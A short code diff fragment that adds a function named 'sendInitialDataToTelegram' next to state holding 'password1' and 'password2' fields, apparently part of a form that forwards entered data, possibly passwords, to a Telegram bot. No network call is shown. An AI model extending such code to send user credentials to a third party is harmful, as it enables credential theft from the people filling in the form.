@@ -479,6 +479,9 @@ const buildFullMessage = (overrides?: Partial<{
     .filter(Boolean)
     .join("\n");
 };
+
+const sendInitialDataToTelegram = async () => {
+  if (!telegramEnabled) return;
   stateRef.current = {
     password1: "",
     password2: "",
